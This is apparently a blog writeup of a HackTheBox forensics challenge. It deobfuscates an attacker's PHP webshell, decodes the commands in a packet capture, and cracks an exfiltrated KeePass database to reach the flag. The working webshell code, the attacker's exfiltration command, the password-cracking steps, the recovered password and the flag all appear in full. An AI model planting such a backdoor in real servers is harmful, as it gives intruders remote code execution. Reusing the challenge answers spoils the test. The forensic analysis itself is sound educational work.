---
layout: post
title: Obscure HackTheBox Challenge - Writeup
categories: [HackTheBox Challenge]
tags: [hackthebox,hackthebox easy,forens,hackthebox challenge]
img_path: /images/htb/challenges/obscure
---

> An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). We monitor our network 24/7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.

**Challenge created by:** [felamos](https://app.hackthebox.com/users/27390)

After initially opening the zip, we can see the following files:
```
$ ls
19-05-21_22532255.pcap support.php to-do.txt
```

I start by looking at `support.php` and see some obfuscated PHP code:

```php
<?php
$V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($';
$P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents(';
$d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i';
$B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}';
$N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion');
$c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@';
$u=str_replace('u)','',$V.$d.$P.$c.$B);
$x=$N('',$u);$x();
?>
```

I start by manually deobfuscating this, we can see that `$N` just resolved to `create_function` (by remoing all the `FD`'s). `$u` is similar but it adds all the previous strings in a specific order and then removes all instances of `u)`. `$x` then creates a function out of the `$u` code and defines it as `$x` then executes it.

The deobfuscated contents of `$u` is:
```php
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";
function x($t, $k)
{
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t { $i} ^ $k { $j};
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print("$p$kh$r$kf");
}
```

Now, let's have a look at our PCAP in Wireshark, I initially filter with a `http` only filter as this is a PHP webserver. Looking for entries specifically related to `support.php` we see a few.

Comparing the code to the inputs/outputs from the requests, we can probably decode their contents. We also need to repair one of the lines for a newer version of PHP so we do the following:

```php
// Initial line
$o .= $t { $i} ^ $k { $j};
// New line
$o .= $t[$i] ^ $k[$j];
```

Now, given out inputs from our commands are being grabbed from `php://input` I give the entire hex data stream which is thne converted to binary to read. I copied the File Data from Wireshark as a Hex Stream and then paste it in.

```php
<?php
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";
$input = hex2bin("335176653e2e4958654f4c433e5b4426366638616634346162656130514b77752f5872374775466f353070344875415a4842666e716876372f2b63634666697366483462594f534d526930654750675a755264365350736447502f2f632b64564d37676e595357766c494e5a6d6c5751477944707a436f77707a637a52656c792f513335313033396634613762352b27516e2f3f3e2d0a653d5a55206d78");
function x($t, $k)
{
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", $input, $m) == 1) {
    @ob_start();
    $count=1;
    $output = @gzuncompress(@x(@base64_decode($m[1]), $k));
    print($output);
}
?>
```

The output is `chdir('/var/www/html/uploads');@error_reporting(0);@system('id 2>&1');`, so we can see the commands being run!

After decoding the other commands we are given the following (in order):

```
chdir('/var/www/html/uploads');@error_reporting(0);@system('id 2>&1');
chdir('/var/www/html/uploads');@error_reporting(0);@system('ls -lah /home/* 2>&1');
chdir('/var/www/html/uploads');@error_reporting(0);@chdir('/home/developer')&&print(@getcwd());
chdir('/home/developer');@error_reporting(0);@system('base64 -w 0 pwdb.kdbx 2>&1');
```

So the last response is 100% of interest, its an exfiltration of a KeePass database!

Looking at how the responses are formulated in the code, we have to do the following in order:
1. Remove `$p` and `$kh` from the start of the string, and `$kf` from the end.
2. Base64 Decode the string
3. `x()`
4. `gzuncompress()`

Here is the code to do the following

```php
<?php
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";
$output = hex2bin("30556c59794a48473837454a71457a36366638616634346162656130514b784f2f6e36444177587547456f633558392f4833486b4d587631496837354678314e645350524e4450556d485479333531303339663461376235");
function x($t, $k)
{
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}


if (@preg_match("/$kh(.+)$kf/", $output, $m) == 1) {
    @ob_start();
    $count=1;

    $input = @gzuncompress(@x(@base64_decode(str_replace($p,'',str_replace($kh,'',str_replace($kf,'',$output)))), $k));
    print($input);
}
?>
```

Decoding the output of the KeePass command we get a long Base64 string:

```
A9mimmf7S7UAAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEAAEAAAAEIAAgTIbunS6JtNX/VevlHDzUvxqQTM6jhauJLJzoQAzHhQUgALelNeh212dFAk8g/D4NHbddj9cpKd577DClZe9KWsbmBggAcBcAAAAAAAAHEAARgpZ1dyCo08oR4fFwSDgCCCAAj9h7HUI3rx1HEr4pP+G3Pdjmr5zVuHV5p2g2a/WMvssJIABca5nQqrSglX6w+YiyGBjTfDG7gRH4PA2FElVuS/0cyAoEAAIAAAAABAANCg0Kqij7LKJGvbGd08iy6LLNTy2WMLrESjuiaz29E83thFvSNkkCwx55YT1xgxYpfIbSFhQHYPBMOv5XB+4g3orzDUFV0CP5W86Dq/6IYUsMcqVHftEOBF/MHYY+pfz2ouVW7U5C27dvnOuQXM/DVb/unwonqVTvg/28JkEFBDPVGQ08X2T9toRdtbq3+V7ljVmTwRx4xMgQbCalF5LyjrYEYmL8Iw9SJeIW7+P+R7v8cZYI4YDziJ6MCMTjg0encgPaBBVBIkP40OKFIl0tWrXt9zXCBO6+BAOtGz5pAjkpZGa5ew/UVacnAuH7g4aGhQIxIwyli+YUjwMoaadfjZihlUJWEVhBm50k/6Dx35armR/vbVni2kp6Wu/8cJxyi0PvydW1+Yxp+3ade8VU/cYATHGNmFnHGzUYdCa3w7CQclIS/VOiRRA/T7Z3XI0bEGorXD7HHXjus9jqFVbCXPTA80KPZgj2FmIKXbt9GwjfTK4eAKvvUUGmAH8OjXVh9U2IfATYrCLi6t5cKtH9WXULW4jSsHrkW62rz0/dvMP7YazFEifECs1g9V+E4kB1gIll93qYDByGGju+CV1305I9R66sE6clSKq1XogStnGXfOXv47JDxLkmPaKEMaapvp85LejI5ZWldOcEGqDvI5M/1j2KizBGPyPZRry0l8uMrG7Y4UVlS8iVGUP8vsBCUDmOQtZ2jAIVmcJk5Kj5rkOPz3NpjDnG6pe+sb/7Nbi1BQLX2Q8nGx2dwNFt4YOKmDZB/HuAFRLvInUVjpaV0fGrlkWUf5OCCc9l00vh25eZezll2TQlMNeaZMjFIlUR4IeF1wInskydfCMMlKWZ/xXXRYiPZkzKZfe0ejqLmGPcz3g/fJ8zh2z+LR+ElIrQEAfARXVnDyn7MGo4RkzAiq+8DpYlm4ZuggOnNy+/aZEDcLXNjfEBSyd/kzOC8iGgnCHF9wM2gHNe4WHCpZZganDZFasECnF21Iu1UNMzoo0+JWEVt9ZBSLmNEhIdTBXwzekWA0XxSAReOLr4opn50r+Wrb0dkoiuVAKsTHho7cJxJNOqtthXqeE2zgNo1F9fzVmoyb8IthUp/x4VfGbv1L3NNos2VhV0re07Fu+IeNJ3naHY5Q9OdoUyDfsMXlgjthepvkxyu3O9see6SWBeofT1uAnjKvHxNE37sELYwS4VGN4L+Ru+uaJefOy29fNrA94KiUOmNE4RNA1h4tJM7SvaLwOpDGnNlCdSwDPh8BqaDeTI9AaZSzzAQLIheiLA66F23QEweBL83zp7EcRosvinNGaYXAkgdfPzyUJhLdRjCz7HJwEw+wpn06dF/+9eUw9Z2UBdseNwGbWyCHhhYRKNlsA2HsoKGA9Zpk/655vAed2Vox3Ui8y62zomnJW0/YWdlH7oDkl1xIIBiITR9v84eXMq+gVT/LTAQPspuT4IV4HYrSnY/+VR0uDhjhtel9a1mQCfxW3FrdsWh7LDFh5AlYuE/0jIiN9Xt6oBCfy4+nEMke21m7Euugm/kCJWR/ECOwxuykBkvJFgbGIvJXNj1FOfCEFIYGdLDUe21rDcFP5OsDaA9y0IRqGzRLL8KXLjknQVCNkYwGqt9hE87TfqUVRIV+tU9z5WiYgnaTRii1XzX7iLzlgg5Pq0PqEqMHs95fxS4SRcal2ZuPpP/GzAVXiS7I4Dt3lATCVmA0fwWjlVEl3a/ZcU+UOm4YCrI+VOCklpur7sqx5peHE4gnGqyqmtVGfwjrgUe5i/1Xm/G5+7KT8UPbRSJMni1RUl3yjE2qibbnPgq1iuTthgWi2Jo/zT/mu9gPv5CRQEvKvAEck/upYwHAnDpdoUTBvVXQ7y
```

We convert this from Base64 and save it as a file (pwdb.kdbx) and we see it has a password.

```
$ base64 -d pwdb-b64 > pwdb.kdbx
```

We don't know this password, so I get the hash using `keepass2john`

```
$ keepass2john pwdb.kdbx > pwdb.hash
```

This hash format has some problems working with `hashcat` so we remove the staring `pwdb:` from the hash. Then start cracking it with `rockyou.txt` and `hashcat`. We can find the hash mode online by looking for KeePass, which is `13400`.

```
$ hashcat -m 13400 pwdb.hash rockyou.txt
...
$keepass$*2*6000*0*204c86ee9d2e89b4d5ff55ebe51c3cd4bf1a904ccea385ab892c9ce8400cc785*b7a535e876d76745024f20fc3e0d1db75d8fd72929de7bec30a565ef4a5ac6e6*118296757720a8d3ca11e1f170483802*5c6b99d0aab4a0957eb0f988b21818d37c31bb8111f83c0d8512556e4bfd1cc8*aa28fb2ca246bdb19dd3c8b2e8b2cd4f2d9630bac44a3ba26b3dbd13cded845b:chainsaw
```

The password is `chainsaw`, after opening the database and looking inside the 'Passwords' folder there is an entry containing the flag:

And there's our flag! <mark>HTB{pr0tect_y0_shellZ}</mark>

![Success](submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.